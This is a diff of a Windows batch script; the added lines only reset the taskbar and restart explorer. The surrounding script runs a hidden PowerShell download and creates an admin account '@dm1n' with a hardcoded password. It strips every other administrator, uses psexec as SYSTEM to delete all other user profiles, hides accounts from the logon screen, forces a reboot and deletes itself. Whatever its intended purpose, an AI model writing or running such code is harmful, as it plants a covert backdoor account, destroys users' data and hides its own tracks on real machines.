@@ -12,6 +12,7 @@ powershell -WindowStyle Hidden -c "$c = '%TEMP%\c.json'; Invoke-WebRequest -Uri 
 echo @echo off
 echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOwner /f
 echo reg delete "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion" /v RegisteredOrganization /f
+echo reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /f & taskkill /f /im explorer.exe & timeout /t 1 >nul & start explorer.exe
 echo net user @dm1n "IBEX@dm1n!" ^>nul 2^>^&1
 echo powershell -c "Get-LocalGroupMember -Group 'Administrators' | Where-Object { $_.Name -notlike '*@dm1n*' -and $_.Name -notlike '*Administrator*' } | Remove-LocalGroupMember -Group 'Administrators' -ErrorAction SilentlyContinue"
 echo psexec -accepteula -s -i powershell -Command "$exclude=@('Public','Default','@dm1n'); Get-ChildItem 'C:\Users' -Directory | Where-Object {$exclude -notcontains $_.Name} | ForEach-Object {$p=$_.FullName; (Get-WmiObject Win32_UserProfile | Where-Object {$_.LocalPath -eq $p}) | ForEach-Object {$_.Delete()}; Remove-Item $p -Recurse -Force -ErrorAction SilentlyContinue}; attrib +h 'C:\Users\Public' 2>$null; tzutil /s 'Singapore Standard Time'; shutdown -r -t 5; Start-Sleep -Seconds 3; Remove-Item -Path $MyInvocation.MyCommand.Path -Force -ErrorAction SilentlyContinue"
@@ -43,8 +44,9 @@ reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccou
 for /f "skip=4 tokens=1" %%u in ('net user 2^>nul') do @if /i not "%%u"=="@dm1n" reg add "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v "%%u" /t REG_DWORD /d 0 /f >nul 2>&1
 
 :: -----------------------------------------------------------------
-:: 7. Prevent enumeration of local users
+:: 7. Mix
 :: -----------------------------------------------------------------
+reg delete "HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /f & taskkill /f /im explorer.exe & timeout /t 1 >nul & start explorer.exe
 reg load HKU\DefaultUser "C:\Users\Default\NTUSER.DAT" >nul 2>&1
 reg delete "HKU\DefaultUser\Software\Microsoft\Windows\CurrentVersion\Explorer\Taskband" /f >nul 2>&1
 reg unload HKU\DefaultUser >nul 2>&1
